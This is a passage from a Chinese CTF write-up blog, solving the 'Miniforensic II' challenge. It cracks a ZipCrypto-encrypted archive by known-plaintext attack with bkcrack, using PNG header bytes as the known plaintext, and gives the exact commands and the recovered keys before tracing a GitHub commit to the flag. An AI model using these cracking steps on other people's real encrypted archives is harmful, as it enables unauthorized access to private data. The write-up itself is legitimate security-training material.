<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509140841677.png" alt="image-20250508125047023"></p>
<p><code>miniLCTF{forens1c5_s0ooooo_1nt4resting}</code></p>
<h2 id="MISC-Miniforensic-II"><a href="#MISC-Miniforensic-II" class="headerlink" title="MISC-Miniforensic II"></a>MISC-Miniforensic II</h2><p>第二题突破点在加密压缩包</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152139702.png" alt="image-20250509145024990"></p>
<p>在文件中一共有两个POST数据包，其中第一个无密码，用于做D盘解密</p>
<p>第二个压缩包，采用ZipCrypto Store的压缩方法，破解类型属于zip已知明文攻击的深入利用，我们不需要知道压缩文件中的完整明文，只需已知其中少量明文字节即可进行破解。</p>
<p>破解具体要求：</p>
<ul>
<li><p>至少已知明文的12个字节及偏移，其中至少8字节需要连续。（根据压缩包中useless.png图片，可以直接获得png的图片头字节数据）</p>
</li>
<li><p>明文对应的文件加密方式为ZipCrypto Store</p>
</li>
</ul>
<p>使用的工具连接：<a target="_blank" rel="noopener" href="https://github.com/kimci86/bkcrack">https://github.com/kimci86/bkcrack</a></p>
<p>利用png图片头格式进行破解，即我们已知：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>满足字节数要求，</p>
<p>这时我们看到当前的压缩包如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116746.png" alt="image-20250509145725331"></p>
<p>txt文档可能是我们需要解题信息，故尝试对文档进行已知明文破解</p>
<p>准备已知明文并以十六进制格式存储至png_header中，</p>
<p>进行攻击获得zip密钥信息：<code>bkcrack.exe -C upload1048.zip -c useless.png -p png_header -o 0 &gt;log.log</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152155429.png" alt="image-20250509150127189"></p>
<p>key：<code>45797e52 f747cc4c 800bd117</code></p>
<p>利用key进行txt破解：<code>bkcrack.exe -C upload1048.zip -c breadcrumb.txt -k 45797e52 f747cc4c 800bd117 -d bread_out.txt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116734.png" alt="image-20250509150427525"></p>
<p>解base64得到github链接：<a target="_blank" rel="noopener" href="https://github.com/root-admin-user/what_do_you_wanna_find.git">https://github.com/root-admin-user/what_do_you_wanna_find.git</a></p>
<p>打开访问，在commits中发现提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152116735.png" alt="image-20250509150559933"></p>
<p>发现一个计算hash的脚本，可能是历史commit记录相关的信息，可以在本地运行一下，但其实hash值就是target_hash变量</p>
<p>89045a3653af483b6bb390e27c10db16873a60d1</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152514426.png" alt="image-20250509150754586"></p>
<p>拼接commit进行访问：<a target="_blank" rel="noopener" href="https://github.com/root-admin-user/what_do_you_wanna_find/commit/89045a3653af483b6bb390e27c10db16873a60d1">https://github.com/root-admin-user/what_do_you_wanna_find/commit/89045a3653af483b6bb390e27c10db16873a60d1</a></p>
<p>得到的secret.py运行即可得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250509152207831.png" alt="image-20250509150934929"></p>
<p><code>miniLCTF{c0ngr4tul4ti0n5_70u'v3_g0t_th3_s3cr3ts}</code></p>

  </div>
</article>
<!-- themes\cactus\layout\_partial\comments.ejs -->




    <div class="blog-post-comments">
        <div id="waline_thread"></div>
    </div>




        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessOneGuess"><span class="toc-number">1.1.</span> <span class="toc-text">GuessOneGuess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Miniup"><span class="toc-number">1.2.</span> <span class="toc-text">Miniup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Click-and-click"><span class="toc-number">1.3.</span> <span class="toc-text">Click and click</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezCC"><span class="toc-number">1.4.</span> <span class="toc-text">ezCC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHessian"><span class="toc-number">1.5.</span> <span class="toc-text">ezHessian</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pybox"><span class="toc-number">1.6.</span> <span class="toc-text">pybox</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%81%93%E5%9D%8E%EF%BC%9Abadchars"><span class="toc-number">1.6.1.</span> <span class="toc-text">第一道坎：badchars</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%81%93%E5%9D%8E%EF%BC%9A%E7%BB%95%E8%BF%87%E9%92%A9%E5%AD%90%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">第二道坎：绕过钩子检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%81%93%E5%9D%8E%EF%BC%9A%E9%80%83%E9%80%B8%E5%87%BA%E5%8E%BB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.6.3.</span> <span class="toc-text">第三道坎：逃逸出去命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%81%93%E5%9D%8E%EF%BC%9A-find%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.4.</span> <span class="toc-text">第四道坎： find提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%81%93%E5%9D%8E%EF%BC%9Aflag%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%85%A8"><span class="toc-number">1.6.5.</span> <span class="toc-text">第五道坎：flag读取不全</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%83%E8%B1%86%E4%BA%BA"><span class="toc-number">2.1.</span> <span class="toc-text">吃豆人</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BA%A6%E9%9C%B8%E8%AF%84%E5%88%86"><span class="toc-number">2.2.</span> <span class="toc-text">麦霸评分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MiniForensics%E2%85%A0"><span class="toc-number">2.3.</span> <span class="toc-text">MiniForensicsⅠ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-Miniforensic-II"><span class="toc-number">2.4.</span> <span class="toc-text">MISC-Miniforensic II</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&text=MiniL2025 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&is_video=false&description=MiniL2025 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=MiniL2025 wp&body=Check out this article: https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&title=MiniL2025 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&name=MiniL2025 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.anch0r.top/2025/05/09/MiniL2025%20wp/&t=MiniL2025 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    anch0r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
      --><li><a href="/">首页</a></li><!--
    --><!--
      --><li><a href="/archives/">归档</a></li><!--
    --><!--
      --><li><a href="/categories/">categories</a></li><!--
    --><!--
      --><li><a href="/tags/">tags</a></li><!--
    --><!--
      --><li><a href="/about/">关于</a></li><!--
    --><!--
      --><li><a href="/search/">搜索</a></li><!--
    -->
      </ul>
      <ul>
        
          <!-- 不蒜子统计 -->
          <span id="busuanzi_container_site_pv">
              本站总访问量<span id="busuanzi_value_site_pv"></span>次
          </span>
          <span class="post-meta-divider">|</span>
          <span id="busuanzi_container_site_uv" style='display:none'>
                  本站访客数<span id="busuanzi_value_site_uv"></span>人
          </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        
      </ul>
    </nav>
  </div>
  
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?9ff526edfca1e553fd58a8876eb755c9";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<!-- Waline Comments -->

  <script type="module">
    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
    var META = ['nick', 'mail', 'link'];
    var REQUIREDFIELDS = ['nick', 'mail', 'link'];

    var emoji = '//unpkg.com/@waline/emojis@1.2.0/qq'.split(',').filter(function(item){
      return item !== ''; // filter()返回满足不为空item
    });
    emoji = emoji.length == 0 ? EMOJI : emoji;

    var meta = 'nick,mail'.split(',').filter(function(item){
      return META.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    meta = meta.length == 0 ? META : meta;

    var requiredFields = 'nick,mail'.split(',').filter(function(item){
      return REQUIREDFIELDS.indexOf(item) > -1; // filter()返回满足META.indexOf(item) > -1为true的item
    });
    requiredFields = requiredFields.length == 0 ? REQUIREDFIELDS : requiredFields;

    init({
      el: '#waline_thread',
      serverURL: 'https://comment.anch0r.top', // Waline 的服务端地址
      path: '' == '' ? window.location.pathname : '', // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
      lang: 'zh-CN' == '' ? 'zh-CN' : 'zh-CN', // 多语言支持，未设置默认英文
      emoji: emoji,
      dark: 'true', // 暗黑模式适配
      commentSorting: '' == '' ? 'latest' : '', // 评论列表排序方式
      meta: meta, // 评论者相关属性
      requiredFields: requiredFields, // 设置必填项，默认匿名
      login: '', // 登录模式状态
      wordLimit: '', // 评论字数限制
      pageSize: '10' == '' ? 10 : '10', // 评论列表分页，每页条数
      imageUploader: '', // 自定义图片上传方法
      highlighter: '', // 代码高亮
      placeholder: '',
      avatar: 'mm',
      visitor: 'false',
      comment_count: 'true',
    });
  </script>



</body>
</html>
